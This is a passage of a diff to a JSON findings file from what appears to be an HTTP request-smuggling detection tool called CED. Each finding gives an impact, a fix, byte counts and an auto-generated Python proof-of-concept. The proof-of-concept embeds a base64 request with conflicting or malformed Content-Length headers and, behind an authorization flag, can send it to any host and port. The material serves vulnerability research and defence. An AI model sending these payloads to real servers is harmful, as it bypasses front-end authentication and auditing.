'ref-lenient-cl'\nPAYLOAD = base64.b64decode('UE9TVCAvIEhUVFAvMS4xDQpDT05URU5ULUxFTkdUSDogKzMNCg0KYWJj')\nEXPECT = (39, 0, 39)\n\n\ndef accounting() -> tuple[int, int, int] | None:\n    \"\"\"用两侧的分帧策略算出：前置转发多少 / 后端消费多少 / 夹带多少。\"\"\"\n    try:\n        front_policy = reference.policy_of(FRONT)\n        back_policy = reference.policy_of(BACK)\n    except KeyError:\n        return None\n    ev = chain_evidence(PAYLOAD, front_policy, back_policy, FRONT, BACK)\n    return ev.forwarded, ev.back_consumed, ev.smuggled_len\n\n\ndef main() -> int:\n    ap = argparse.ArgumentParser(description=\"CED 生成的复现脚本\")\n    ap.add_argument(\"--send\", metavar=\"HOST:PORT\",\n                    help=\"把最小复现样本真的发到这个地址（前置入口）\")\n    ap.add_argument(\"--i-am-authorized\", action=\"store_true\",\n                    help=\"确认对 --send 的目标已获授权；缺此项则拒绝发送\")\n    args = ap.parse_args()\n\n    print(f\"用例        {CASE_ID}\")\n    print(f\"链路        {FRONT} → {BACK}\")\n    print(f\"样本长度    {len(PAYLOAD)} 字节\")\n\n    got = accounting()\n    if got is None:\n        print(\"字节归属    无法量化（两侧含非本地实现）—— 请在真实拓扑上复现\")\n    else:\n        forwarded, consumed, smuggled = got\n        print(f\"前置转发    {forwarded} 字节\")\n        print(f\"后端消费    {consumed} 字节\")\n        print(f\"被夹带      {smuggled} 字节\")\n        if EXPECT[0] is not None:\n            ok = got == EXPECT\n            print(f\"断言        {'PASS' if ok else 'FAIL'}（期望 {EXPECT}）\")\n            if not ok:\n                print(\"说明        期望值来自生成时的实现；不一致说明复现条件已变，\")\n                print(\"            请重新跑一次 scan 生成新的 PoC，而不是改期望值。\")\n\n    if args.send:\n        if not args.i_am_authorized:\n            print(\"拒绝发送：--send 需要同时给出 --i-am-authorized\"\n                  \"（只对自有或已授权目标使用）。\")\n            return 2\n        host, _, port = args.send.rpartition(\":\")\n        with socket.create_connection((host or \"127.0.0.1\", int(port)), timeout=10) as sock:\n            sock.sendall(PAYLOAD)\n            sock.shutdown(socket.SHUT_WR)\n            response = b\"\"\n            while True:\n                chunk = sock.recv(65536)\n                if not chunk:\n                    break\n                response += chunk\n        print(f\"已发送      {args.send}，收到 {len(response)} 字节响应\")\n        print(\"提示        走私的效果要看**下一条请求**，单次发送看不到；\"\n              \"请在后端日志或探针视角里确认被夹带的字节。\")\n    return 0\n\n\nif __name__ == \"__main__\":\n    raise SystemExit(main())\n",
+      "script": "#!/usr/bin/env python3\n\"\"\"请求走私（HTTP/1.1 消息边界分歧）\n\n由 CED 自动生成 —— 用例 3d0a4b5b，场景 desync，领域 http1-framing。\n零第三方依赖；放在仓库任意位置都能跑（脚本会自己往上找仓库根目录）。\n\n    python poc_3d0a4b5b.py                      # 离线：算清量化指标（默认，不联网）\n    python poc_3d0a4b5b.py --send HOST:PORT --i-am-authorized\n                                            # 真的把最小复现样本发出去（仅限已授权目标）\n\n合规：--send 必须同时给出 --i-am-authorized。只对自有或已授权的目标使用。\n\"\"\"\nfrom __future__ import annotations\n\nimport argparse\nimport base64\nimport socket\nimport sys\nfrom pathlib import Path\n\n\ndef _find_root() -> Path:\n    \"\"\"往上找带 ced/__init__.py 的目录 —— 脚本被挪到哪儿都能跑。\"\"\"\n    here = Path(__file__).resolve()\n    for parent in here.parents:\n        if (parent / \"ced\" / \"__init__.py\").is_file():\n            return parent\n    return here.parent\n\n\nROOT = _find_root()\nif str(ROOT) not in sys.path:\n    sys.path.insert(0, str(ROOT))\n\nfrom ced.impls import reference\nfrom ced.orchestrate.chain import chain_evidence\n\nCASE_ID = '3d0a4b5b'\nFRONT = 'ref-cl-first'\nBACK = 'ref-lenient-cl'\nPAYLOAD = base64.b64decode('UE9TVCAvIEhUVFAvMS4xDQpDT05URU5ULUxFTkdUSDogKzMNCg0KYWJj')\nEXPECT = (39, 0, 39)\n\n\ndef measure():\n    \"\"\"按两侧的策略算出量化指标。算不出来返回 None。\"\"\"\n    try:\n        front_policy = reference.policy_of(FRONT)\n        back_policy = reference.policy_of(BACK)\n    except KeyError:\n        return None\n    ev = chain_evidence(PAYLOAD, front_policy, back_policy, FRONT, BACK)\n    return ev.forwarded, ev.back_consumed, ev.smuggled_len\n\n\ndef main() -> int:\n    ap = argparse.ArgumentParser(description=\"CED 生成的复现脚本\")\n    ap.add_argument(\"--send\", metavar=\"HOST:PORT\",\n                    help=\"把最小复现样本真的发到这个地址（前置入口）\")\n    ap.add_argument(\"--i-am-authorized\", action=\"store_true\",\n                    help=\"确认对 --send 的目标已获授权；缺此项则拒绝发送\")\n    args = ap.parse_args()\n\n    print(f\"用例        {CASE_ID}\")\n    print(f\"链路        {FRONT} → {BACK}\")\n    print(f\"样本长度    {len(PAYLOAD)} 字节\")\n\n    got = measure()\n    ok = got is not None\n    if got is None:\n        print(\"量化        无法计算（两侧含非本地实现）—— 请在真实拓扑上复现\")\n    else:\n        forwarded, consumed, smuggled = got\n        print(f\"前置转发    {forwarded} 字节\")\n        print(f\"后端消费    {consumed} 字节\")\n        print(f\"被夹带      {smuggled} 字节\")\n        if EXPECT[0] is not None:\n            ok = got == tuple(EXPECT)\n            print(f\"断言        {'PASS' if ok else 'FAIL'}（期望 {EXPECT}）\")\n\n    if args.send:\n        if not args.i_am_authorized:\n            print(\"拒绝发送：--send 需要同时给出 --i-am-authorized\"\n                  \"（只对自有或已授权目标使用）。\")\n            return 2\n        host, _, port = args.send.rpartition(\":\")\n        with socket.create_connection((host or \"127.0.0.1\", int(port)), timeout=10) as sock:\n            sock.sendall(PAYLOAD)\n            sock.shutdown(socket.SHUT_WR)\n            response = b\"\"\n            while True:\n                chunk = sock.recv(65536)\n                if not chunk:\n                    break\n                response += chunk\n        print(f\"已发送      {args.send}，收到 {len(response)} 字节响应\")\n    return 0 if ok else 1\n\n\nif __name__ == \"__main__\":\n    raise SystemExit(main())\n",
       "file_name": "poc_3d0a4b5b.py"
     },
     {
@@ -155,13 +215,28 @@
       "left": "ref-cl-first",
       "right": "ref-lenient-cl",
       "axis": "cl_value",
+      "domain": "http1-framing",
       "impact": "前置与后端对『这条请求到哪里结束』判断不同：前置转发的字节里，后端只消费了一部分，剩下的成为后端眼中**下一条请求**的开头。于是攻击者可以在前置完全看不见的情况下，向后端注入一条自选请求 —— 前置的鉴权、限流、审计对这条被夹带的请求全部失效。",
       "fix": "对 CL 与 TE 并存、非规范 CL、冲突 CL、TE 终编码非 chunked 的请求一律 400 拒绝；上游必须在转发前完成定帧并重写为规范形式",
       "evidence": "移除请求头 `Content-Length: 3`；移除请求头 `Content-Length: 4` —— 分歧消失，说明它由攻击者可直接发送的部分承载",
       "chain_desc": "若 **ref-cl-first → ref-lenient-cl** 串联：前置未转发任何字节（按自身策略拒绝）→ 不产生夹带；但『一侧拒绝、一侧接受』本身构成绕过/可用性面",
-      "forwarded": 0,
-      "back_consumed": 0,
-      "smuggled_len": 0,
+      "quant": {
+        "label": "被夹带字节数",
+        "describe": "若 **ref-cl-first → ref-lenient-cl** 串联：前置未转发任何字节（按自身策略拒绝）→ 不产生夹带；但『一侧拒绝、一侧接受』本身构成绕过/可用性面",
+        "values": {
+          "front": "ref-cl-first",
+          "back": "ref-lenient-cl",
+          "forwarded": "0",
+          "back_consumed": "0",
+          "smuggled": "0"
+        },
+        "numbers": [
+          0,
+          0,
+          0
+        ],
+        "verified": true
+      },
       "verified": true,
       "original_len": 78,
       "sample_len": 61,
@@ -174,7 +249,7 @@
         "紧随其后的下一条请求会被拼接在那 0 字节之后，被夹带的字节成为后端眼中另一条请求的开头",
         "修复：对 CL 与 TE 并存、非规范 CL、冲突 CL、TE 终编码非 chunked 的请求一律 400 拒绝；上游必须在转发前完成定帧并重写为规范形式"
       ],
-      "script": "#!/usr/bin/env python3\n\"\"\"请求走私（HTTP/1.1 消息边界分歧）\n\n由 CED 自动生成 —— 用例 4d4c1c3b，场景 desync。\n零第三方依赖；放在仓库任意位置都能跑（脚本会自己往上找仓库根目录）。\n\n    python poc_4d4c1c3b.py                      # 离线：算清字节归属（默认，不联网）\n    python poc_4d4c1c3b.py --send 127.0.0.1:8080 --i-am-authorized\n                                            # 真的把最小复现样本发出去（仅限已授权目标）\n\n合规：--send 必须同时给出 --i-am-authorized。只对自有或已授权的目标使用。\n\"\"\"\nfrom __future__ import annotations\n\nimport argparse\nimport base64\nimport socket\nimport sys\nfrom pathlib import Path\n\n\ndef _find_root() -> Path:\n    \"\"\"往上找带 ced/__init__.py 的目录 —— 脚本被挪到哪儿都能跑。\"\"\"\n    here = Path(__file__).resolve()\n    for parent in here.parents:\n        if (parent / \"ced\" / \"__init__.py\").is_file():\n            return parent\n    return here.parent\n\n\nROOT = _find_root()\nif str(ROOT) not in sys.path:\n    sys.path.insert(0, str(ROOT))\n\nfrom ced.impls import reference                      # noqa: E402\nfrom ced.orchestrate.chain import chain_evidence     # noqa: E402\n\nCASE_ID = '4d4c1c3b'\nFRONT = 'ref-cl-first'\nBACK = 'ref-lenient-cl'\nPAYLOAD = base64.b64decode('UE9TVCAvIEhUVFAvMS4xDQpDb250ZW50LUxlbmd0aDogMw0KQ29udGVudC1MZW5ndGg6IDQNCg0KYWJjZA==')\nEXPECT = (0, 0, 0)\n\n\ndef accounting() -> tuple[int, int, int] | None:\n    \"\"\"用两侧的分帧策略算出：前置转发多少 / 后端消费多少 / 夹带多少。\"\"\"\n    try:\n        front_policy = reference.policy_of(FRONT)\n        back_policy = reference.policy_of(BACK)\n    except KeyError:\n        return None\n    ev = chain_evidence(PAYLOAD, front_policy, back_policy, FRONT, BACK)\n    return ev.forwarded, ev.back_consumed, ev.smuggled_len\n\n\ndef main() -> int:\n    ap = argparse.ArgumentParser(description=\"CED 生成的复现脚本\")\n    ap.add_argument(\"--send\", metavar=\"HOST:PORT\",\n                    help=\"把最小复现样本真的发到这个地址（前置入口）\")\n    ap.add_argument(\"--i-am-authorized\", action=\"store_true\",\n                    help=\"确认对 --send 的目标已获授权；缺此项则拒绝发送\")\n    args = ap.parse_args()\n\n    print(f\"用例        {CASE_ID}\")\n    print(f\"链路        {FRONT} → {BACK}\")\n    print(f\"样本长度    {len(PAYLOAD)} 字节\")\n\n    got = accounting()\n    if got is None:\n        print(\"字节归属    无法量化（两侧含非本地实现）—— 请在真实拓扑上复现\")\n    else:\n        forwarded, consumed, smuggled = got\n        print(f\"前置转发    {forwarded} 字节\")\n        print(f\"后端消费    {consumed} 字节\")\n        print(f\"被夹带      {smuggled} 字节\")\n        if EXPECT[0] is not None:\n            ok = got == EXPECT\n            print(f\"断言        {'PASS' if ok else 'FAIL'}（期望 {EXPECT}）\")\n            if not ok:\n                print(\"说明        期望值来自生成时的实现；不一致说明复现条件已变，\")\n                print(\"            请重新跑一次 scan 生成新的 PoC，而不是改期望值。\")\n\n    if args.send:\n        if not args.i_am_authorized:\n            print(\"拒绝发送：--send 需要同时给出 --i-am-authorized\"\n                  \"（只对自有或已授权目标使用）。\")\n            return 2\n        host, _, port = args.send.rpartition(\":\")\n        with socket.create_connection((host or \"127.0.0.1\", int(port)), timeout=10) as sock:\n            sock.sendall(PAYLOAD)\n            sock.shutdown(socket.SHUT_WR)\n            response = b\"\"\n            while True:\n                chunk = sock.recv(65536)\n                if not chunk:\n                    break\n                response += chunk\n        print(f\"已发送      {args.send}，收到 {len(response)} 字节响应\")\n        print(\"提示        走私的效果要看**下一条请求**，单次发送看不到；\"\n              \"请在后端日志或探针视角里确认被夹带的字节。\")\n    return 0\n\n\nif __name__ == \"__main__\":\n    raise SystemExit(main())\n",
+      "script": "#!/usr/bin/env python3\n\"\"\"请求走私（HTTP/1.1 消息边界分歧）\n\n由 CED 自动生成 —— 用例 4d4c1c3b，场景 desync，领域 http1-framing。\n零第三方依赖；放在仓库任意位置都能跑（脚本会自己往上找仓库根目录）。\n\n    python poc_4d4c1c3b.py                      # 离线：算清量化指标（默认，不联网）\n    python poc_4d4c1c3b.py --send HOST:PORT --i-am-authorized\n                                            # 真的把最小复现样本发出去（仅限已授权目标）\n\n合规：--send 必须同时给出 --i-am-authorized。只对自有或已授权的目标使用。\n\"\"\"\nfrom __future__ import annotations\n\nimport argparse\nimport base64\nimport socket\nimport sys\nfrom pathlib import Path\n\n\ndef _find_root() -> Path:\n    \"\"\"往上找带 ced/__init__.py 的目录 —— 脚本被挪到哪儿都能跑。\"\"\"\n    here = Path(__file__).resolve()\n    for parent in here.parents:\n        if (parent / \"ced\" / \"__init__.py\").is_file():\n            return parent\n    return here.parent\n\n\nROOT = _find_root()\nif str(ROOT) not in sys.path:\n    sys.path.insert(0, str(ROOT))\n\nfrom ced.impls import reference\nfrom ced.orchestrate.chain import chain_evidence\n\nCASE_ID = '4d4c1c3b'\nFRONT = 'ref-cl-first'\nBACK = 'ref-lenient-cl'\nPAYLOAD = base64.b64decode('UE9TVCAvIEhUVFAvMS4xDQpDb250ZW50LUxlbmd0aDogMw0KQ29udGVudC1MZW5ndGg6IDQNCg0KYWJjZA==')\nEXPECT = (0, 0, 0)\n\n\ndef measure():\n    \"\"\"按两侧的策略算出量化指标。算不出来返回 None。\"\"\"\n    try:\n        front_policy = reference.policy_of(FRONT)\n        back_policy = reference.policy_of(BACK)\n    except KeyError:\n        return None\n    ev = chain_evidence(PAYLOAD, front_policy, back_policy, FRONT, BACK)\n    return ev.forwarded, ev.back_consumed, ev.smuggled_len\n\n\ndef main() -> int:\n    ap = argparse.ArgumentParser(description=\"CED 生成的复现脚本\")\n    ap.add_argument(\"--send\", metavar=\"HOST:PORT\",\n                    help=\"把最小复现样本真的发到这个地址（前置入口）\")\n    ap.add_argument(\"--i-am-authorized\", action=\"store_true\",\n                    help=\"确认对 --send 的目标已获授权；缺此项则拒绝发送\")\n    args = ap.parse_args()\n\n    print(f\"用例        {CASE_ID}\")\n    print(f\"链路        {FRONT} → {BACK}\")\n    print(f\"样本长度    {len(PAYLOAD)} 字节\")\n\n    got = measure()\n    ok = got is not None\n    if got is None:\n        print(\"量化        无法计算（两侧含非本地实现）—— 请在真实拓扑上复现\")\n    else:\n        forwarded, consumed, smuggled = got\n        print(f\"前置转发    {forwarded} 字节\")\n        print(f\"后端消费    {consumed} 字节\")\n        print(f\"被夹带      {smuggled} 字节\")\n        if EXPECT[0] is not None:\n            ok = got == tuple(EXPECT)\n            print(f\"断言        {'PASS' if ok else 'FAIL'}（期望 {EXPECT}）\")\n\n    if args.send:\n        if not args.i_am_authorized:\n            print(\"拒绝发送：--send 需要同时给出 --i-am-authorized\"\n                  \"（只对自有或已授权目标使用）。\")\n            return 2\n        host, _, port = args.send.rpartition(\":\")\n        with socket.create_connection((host or \"127.0.0.1\", int(port)), timeout=10) as sock:\n            sock.sendall(PAYLOAD)\n            sock.shutdown(socket.SHUT_WR)\n            response = b\"\"\n            while True:\n                chunk = sock.recv(65536)\n                if not chunk:\n                    break\n                response += chunk\n        print(f\"已发送      {args.send}，收到 {len(response)} 字节响应\")\n    return 0 if ok else 1\n\n\nif __name__ == \"__main__\":\n    raise SystemExit(main())\n",
       "file_name": "poc_4d4c1c3b.py"
     },
     {
@@ -186,13 +261,28 @@
       "left": "ref-cl-first",
       "right": "ref-lenient-cl",
       "axis": "cl_value",
+      "domain": "http1-framing",
       "impact": "前置与后端对『这条请求到哪里结束』判断不同：前置转发的字节里，后端只消费了一部分，剩下的成为后端眼中**下一条请求**的开头。于是攻击者可以在前置完全看不见的情况下，向后端注入一条自选请求 —— 前置的鉴权、限流、审计对这条被夹带的请求全部失效。",
       "fix": "对 CL 与 TE 并存、非规范 CL、冲突 CL、TE 终编码非 chunked 的请求一律 400 拒绝；上游必须在转发前完成定帧并重写为规范形式",
       "evidence": "移除请求头 `CONTENT-LENGTH: 3`；移除请求头 `Content-Length: 4` —— 分歧消失，说明它由攻击者可直接发送的部分承载",
       "chain_desc": "若 **ref-cl-first → ref-lenient-cl** 串联：前置未转发任何字节（按自身策略拒绝）→ 不产生夹带；但『一侧拒绝、一侧接受』本身构成绕过/可用性面",
-      "forwarded": 0,
-      "back_consumed": 0,
-      "smuggled_len": 0,
+      "quant": {
+        "label": "被夹带字节数",
+        "describe": "若 **ref-cl-first → ref-lenient-cl** 串联：前置未转发任何字节（按自身策略拒绝）→ 不产生夹带；但『一侧拒绝、一侧接受』本身构成绕过/可用性面",
+        "values": {
+          "front": "ref-cl-first",
+          "back": "ref-lenient-cl",
+          "forwarded": "0",
+          "back_consumed": "0",
+          "smuggled": "0"
+        },
+        "numbers": [
+          0,
+          0,
+          0
+        ],
+        "verified": true
+      },
       "verified": true,
       "original_len": 78,
       "sample_len": 61,
@@ -205,7 +295,7 @@
         "紧随其后的下一条请求会被拼接在那 0 字节之后，被夹带的字节成为后端眼中另一条请求的开头",
         "修复：对 CL 与 TE 并存、非规范 CL、冲突 CL、TE 终编码非 chunked 的请求一律 400 拒绝；上游必须在转发前完成定帧并重写为规范形式"
       ],
-      "script": "#!/usr/bin/env python3\n\"\"\"请求走私（HTTP/1.1 消息边界分歧）\n\n由 CED 自动生成 —— 用例 de0a72c9，场景 desync。\n零第三方依赖；放在仓库任意位置都能跑（脚本会自己往上找仓库根目录）。\n\n    python poc_de0a72c9.py                      # 离线：算清字节归属（默认，不联网）\n    python poc_de0a72c9.py --send 127.0.0.1:8080 --i-am-authorized\n                                            # 真的把最小复现样本发出去（仅限已授权目标）\n\n合规：--send 必须同时给出 --i-am-authorized。只对自有或已授权的目标使用。\n\"\"\"\nfrom __future__ import annotations\n\nimport argparse\nimport base64\nimport socket\nimport sys\nfrom pathlib import Path\n\n\ndef _find_root() -> Path:\n    \"\"\"往上找带 ced/__init__.py 的目录 —— 脚本被挪到哪儿都能跑。\"\"\"\n    here = Path(__file__).resolve()\n    for parent in here.parents:\n        if (parent / \"ced\" / \"__init__.py\").is_file():\n            return parent\n    return here.parent\n\n\nROOT = _find_root()\nif str(ROOT) not in sys.path:\n    sys.path.insert(0, str(ROOT))\n\nfrom ced.impls import reference                      # noqa: E402\nfrom ced.orchestrate.chain import chain_evidence     # noqa: E402\n\nCASE_ID = 'de0a72c9'\nFRONT = 'ref-cl-first'\nBACK = 'ref-lenient-cl'\nPAYLOAD = base64.b64decode('UE9TVCAvIEhUVFAvMS4xDQpDT05URU5ULUxFTkdUSDogMw0KQ29udGVudC1MZW5ndGg6IDQNCg0KYWJjZA==')\nEXPECT = (0, 0, 0)\n\n\ndef accounting() -> tuple[int, int, int] | None:\n    \"\"\"用两侧的分帧策略算出：前置转发多少 / 后端消费多少 / 夹带多少。\"\"\"\n    try:\n        front_policy = reference.policy_of(FRONT)\n        back_policy = reference.policy_of(BACK)\n    except KeyError:\n        return None\n    ev = chain_evidence(PAYLOAD, front_policy, back_policy, FRONT, BACK)\n    return ev.forwarded, ev.back_consumed, ev.smuggled_len\n\n\ndef main() -> int:\n    ap = argparse.ArgumentParser(description=\"CED 生成的复现脚本\")\n    ap.add_argument(\"--send\", metavar=\"HOST:PORT\",\n                    help=\"把最小复现样本真的发到这个地址（前置入口）\")\n    ap.add_argument(\"--i-am-authorized\", action=\"store_true\",\n                    help=\"确认对 --send 的目标已获授权；缺此项则拒绝发送\")\n    args = ap.parse_args()\n\n    print(f\"用例        {CASE_ID}\")\n    print(f\"链路        {FRONT} → {BACK}\")\n    print(f\"样本长度    {len(PAYLOAD)} 字节\")\n\n    got = accounting()\n    if got is None:\n        print(\"字节归属    无法量化（两侧含非本地实现）—— 请在真实拓扑上复现\")\n    else:\n        forwarded, consumed, smuggled = got\n        print(f\"前置转发    {forwarded} 字节\")\n        print(f\"后端消费    {consumed} 字节\")\n        print(f\"被夹带      {smuggled} 字节\")\n        if EXPECT[0] is not None:\n            ok = got == EXPECT\n            print(f\"断言        {'PASS' if ok else 'FAIL'}（期望 {EXPECT}）\")\n            if not ok:\n                print(\"说明        期望值来自生成时的实现；不一致说明复现条件已变，\")\n                print(\"            请重新跑一次 scan 生成新的 PoC，而不是改期望值。\")\n\n    if args.send:\n        if not args.i_am_authorized:\n            print(\"拒绝发送：--send 需要同时给出 --i-am-authorized\"\n                  \"（只对自有或已授权目标使用）。\")\n            return 2\n        host, _, port = args.send.rpartition(\":\")\n        with socket.create_connection((host or \"127.0.0.1\", int(port)), timeout=10) as sock:\n            sock.sendall(PAYLOAD)\n            sock.shutdown(socket.SHUT_WR)\n            response = b\"\"\n            while True:\n                chunk = sock.recv(65536)\n                if not chunk:\n                    break\n                response += chunk\n        print(f\"已发送      {args.send}，收到 {len(response)} 字节响应\")\n        print(\"提示        走私的效果要看**下一条请求**，单次发送看不到；\"\n              \"请在后端日志或探针视角里确认被夹带的字节。\")\n    return 0\n\n\nif __name__ == \"__main__\":\n    raise SystemExit(main())\n",
+      "script": "#!/usr/bin/env python3\n\"\"\"请求走私（HTTP/1.1 消息边界分歧）\n\n由 CED 自动生成 —— 用例 de0a72c9，场景 desync，领域 http1-framing。\n零第三方依赖；放在仓库任意位置都能跑（脚本会自己往上找仓库根目录）。\n\n    python poc_de0a72c9.py                      # 离线：算清量化指标（默认，不联网）\n    python poc_de0a72c9.py --send HOST:PORT --i-am-authorized\n                                            # 真的把最小复现样本发出去（仅限已授权目标）\n\n合规：--send 必须同时给出 --i-am-authorized。只对自有或已授权的目标使用。\n\"\"\"\nfrom __future__ import annotations\n\nimport argparse\nimport base64\nimport socket\nimport sys\nfrom pathlib import Path\n\n\ndef _find_root() -> Path:\n    \"\"\"往上找带 ced/__init__.py 的目录 —— 脚本被挪到哪儿都能跑。\"\"\"\n    here = Path(__file__).resolve()\n    for parent in here.parents:\n        if (parent / \"ced\" / \"__init__.py\").is_file():\n            return parent\n    return here.parent\n\n\nROOT = _find_root()\nif str(ROOT) not in sys.path:\n    sys.path.insert(0, str(ROOT))\n\nfrom ced.impls import reference\nfrom ced.orchestrate.chain import chain_evidence\n\nCASE_ID = 'de0a72c9'\nFRONT = 'ref-cl-first'\nBACK = 'ref-lenient-cl'\nPAYLOAD = base64.b64decode('UE9TVCAvIEhUVFAvMS4xDQpDT05URU5ULUxFTkdUSDogMw0KQ29udGVudC1MZW5ndGg6IDQNCg0KYWJjZA==')\nEXPECT = (0, 0, 0)\n\n\ndef measure():\n    \"\"\"按两侧的策略算出量化指标。算不出来返回 None。\"\"\"\n    try:\n        front_policy = reference.policy_of(FRONT)\n        back_policy = reference.policy_of(BACK)\n    except KeyError:\n        return None\n    ev = chain_evidence(PAYLOAD, front_policy, back_policy, FRONT, BACK)\n    return ev.forwarded, ev.back_consumed, ev.smuggled_len\n\n\ndef main() -> int:\n    ap = argparse.ArgumentParser(description=\"CED 生成的复现脚本\")\n    ap.add_argument(\"--send\", metavar=\"HOST:PORT\",\n                    help=\"把最小复现样本真的发到这个地址（前置入口）\")\n    ap.add_argument(\"--i-am-authorized\", action=\"store_true\",\n                    help=\"确认对 --send 的目标已获授权；缺此项则拒绝发送\")\n    args = ap.parse_args()\n\n    print(f\"用例        {CASE_ID}\")\n    print(f\"链路        {FRONT} → {BACK}\")\n    print(f\"样本长度    {len(PAYLOAD)} 字节\")\n\n    got = measure()\n    ok = got is not None\n    if got is None:\n        print(\"量化        无法计算（两侧含非本地实现）—— 请在真实拓扑上复现\")\n    else:\n        forwarded, consumed, smuggled = got\n        print(f\"前置转发    {forwarded} 字节\")\n        print(f\"后端消费    {consumed} 字节\")\n        print(f\"被夹带      {smuggled} 字节\")\n        if EXPECT[0] is not None:\n            ok = got == tuple(EXPECT)\n            print(f\"断言        {'PASS' if ok else 'FAIL'}（期望 {EXPECT}）\")\n\n    if args.send:\n        if not args.i_am_authorized:\n            print(\"拒绝发送：--send 需要同时给出 --i-am-authorized\"\n                  \"（只对自有或已授权目标使用）。\")\n            return 2\n        host, _, port = args.send.rpartition(\":\")\n        with socket.create_connection((host or \"127.0.0.1\", int(port)), timeout=10) as sock:\n            sock.sendall(PAYLOAD)\n            sock.shutdown(socket.SHUT_WR)\n            response = b\"\"\n            while True:\n                chunk = sock.recv(65536)\n                if not chunk:\n                    break\n                response += chunk\n        print(f\"已发送      {args.send}，收到 {len(response)} 字节响应\")\n    return 0 if ok else 1\n\n\nif __name__ == \"__main__\":\n    raise SystemExit(main())\n",
       "file_name": "poc_de0a72c9.py"
     },
     {
@@ -217,13 +307,28 @@
       "left": "ref-cl-first",
       "right": "ref-lenient-cl",
       "axis": "cl_value",
+      "domain": "http1-framing",
       "impact": "前置与后端对『这条请求到哪里结束』判断不同：前置转发的字节里，后端只消费了一部分，剩下的成为后端眼中**下一条请求**的开头。于是攻击者可以在前置完全看不见的情况下，向后端注入一条自选请求 —— 前置的鉴权、限流、审计对这条被夹带的请求全部失效。",
       "fix": "对 CL 与 TE 并存、非规范 CL、冲突 CL、TE 终编码非 chunked 的请求一律 400 拒绝；上游必须在转发前完成定帧并重写为规范形式",
       "evidence": "移除请求头 `Content-Length: +3` —— 分歧消失，说明它由攻击者可直接发送的部分承载",
       "chain_desc": "若 **ref-cl-first → ref-lenient-cl** 串联：前置转发 39 字节，后端只消费 0 字节 → **39 字节被夹带**，将成为下一条请求的开头",
-      "forwarded": 39,
-      "back_consumed": 0,
-      "smuggled_len": 39,
+      "quant": {
+        "label": "被夹带字节数",
+        "describe": "若 **ref-cl-first → ref-lenient-cl** 串联：前置转发 39 字节，后端只消费 0 字节 → **39 字节被夹带**，将成为下一条请求的开头",
+        "values": {
+          "front": "ref-cl-first",
+          "back": "ref-lenient-cl",
+          "forwarded": "39",
+          "back_consumed": "0",
+          "smuggled": "39"
+        },
+        "numbers": [
+          39,
+          0,
+          39
+        ],
+        "verified": true
+      },
       "verified": true,
       "original_len": 79,
       "sample_len": 43,
@@ -236,7 +341,7 @@
         "紧随其后的下一条请求会被拼接在那 39 字节之后，被夹带的字节成为后端眼中另一条请求的开头",
         "修复：对 CL 与 TE 并存、非规范 CL、冲突 CL、TE 终编码非 chunked 的请求一律 400 拒绝；上游必须在转发前完成定帧并重写为规范形式"
       ],
-      "script": "#!/usr/bin/env python3\n\"\"\"请求走私（HTTP/1.1 消息边界分歧）\n\n由 CED 自动生成 —— 用例 1cfdd820，场景 desync。\n零第三方依赖；放在仓库任意位置都能跑（脚本会自己往上找仓库根目录）。\n\n    python poc_1cfdd820.py                      # 离线：算清字节归属（默认，不联网）\n    python poc_1cfdd820.py --send 127.0.0.1:8080 --i-am-authorized\n                                            # 真的把最小复现样本发出去（仅限已授权目标）\n\n合规：--send 必须同时给出 --i-am-authorized。只对自有或已授权的目标使用。\n\"\"\"\nfrom __future__ import annotations\n\nimport argparse\nimport base64\nimport socket\nimport sys\nfrom pathlib import Path\n\n\ndef _find_root() -> Path:\n    \"\"\"往上找带 ced/__init__.py 的目录 —— 脚本被挪到哪儿都能跑。\"\"\"\n    here = Path(__file__).resolve()\n    for parent in here.parents:\n        if (parent / \"ced\" / \"__init__.py\").is_file():\n            return parent\n    return here.parent\n\n\nROOT = _find_root()\nif str(ROOT) not in sys.path:\n    sys.path.insert(0, str(ROOT))\n\nfrom ced.impls import reference                      # noqa: E402\nfrom ced.orchestrate.chain import chain_evidence     # noqa: E402\n\nCASE_ID = '1cfdd820'\nFRONT = 'ref-cl-first'\nBACK = 'ref-lenient-cl'\nPAYLOAD = base64.b64decode('UE9TVCAvIEhUVFAvMS4xDQpDb250ZW50LUxlbmd0aDogKzMNCg0KYWJjZA==')\nEXPECT = (39, 0, 39)\n\n\ndef accounting() -> tuple[int, int, int] | None:\n    \"\"\"用两侧的分帧策略算出：前置转发多少 / 后端消费多少 / 夹带多少。\"\"\"\n    try:\n        front_policy = reference.policy_of(FRONT)\n        back_policy = reference.policy_of(BACK)\n    except KeyError:\n        return None\n    ev = chain_evidence(PAYLOAD, front_policy, back_policy, FRONT, BACK)\n    return ev.forwarded, ev.back_consumed, ev.smuggled_len\n\n\ndef main() -> int:\n    ap = argparse.ArgumentParser(description=\"CED 生成的复现脚本\")\n    ap.add_argument(\"--send\", metavar=\"HOST:PORT\",\n                    help=\"把最小复现样本真的发到这个地址（前置入口）\")\n    ap.add_argument(\"--i-am-authorized\", action=\"store_true\",\n                    help=\"确认对 --send 的目标已获授权；缺此项则拒绝发送\")\n    args = ap.parse_args()\n\n    print(f\"用例        {CASE_ID}\")\n    print(f\"链路        {FRONT} → {BACK}\")\n    print(f\"样本长度    {len(PAYLOAD)} 字节\")\n\n    got = accounting()\n    if got is None:\n        print(\"字节归属    无法量化（两侧含非本地实现）—— 请在真实拓扑上复现\")\n    else:\n        forwarded, consumed, smuggled = got\n        print(f\"前置转发    {forwarded} 字节\")\n        print(f\"后端消费    {consumed} 字节\")\n        print(f\"被夹带      {smuggled} 字节\")\n        if EXPECT[0] is not None:\n            ok = got == EXPECT\n            print(f\"断言        {'PASS' if ok else 'FAIL'}（期望 {EXPECT}）\")\n            if not ok:\n                print(\"说明        期望值来自生成时的实现；不一致说明复现条件已变，\")\n                print(\"            请重新跑一次 scan 生成新的 PoC，而不是改期望值。\")\n\n    if args.send:\n        if not args.i_am_authorized:\n            print(\"拒绝发送：--send 需要同时给出 --i-am-authorized\"\n                  \"（只对自有或已授权目标使用）。\")\n            return 2\n        host, _, port = args.send.rpartition(\":\")\n        with socket.create_connection((host or \"127.0.0.1\", int(port)), timeout=10) as sock:\n            sock.sendall(PAYLOAD)\n            sock.shutdown(socket.SHUT_WR)\n            response = b\"\"\n            while True:\n                chunk = sock.recv(65536)\n                if not chunk:\n                    break\n                response += chunk\n        print(f\"已发送      {args.send}，收到 {len(response)} 字节响应\")\n        print(\"提示        走私的效果要看**下一条请求**，单次发送看不到；\"\n              \"请在后端日志或探针视角里确认被夹带的字节。\")\n    return 0\n\n\nif __name__ == \"__main__\":\n    raise SystemExit(main())\n",
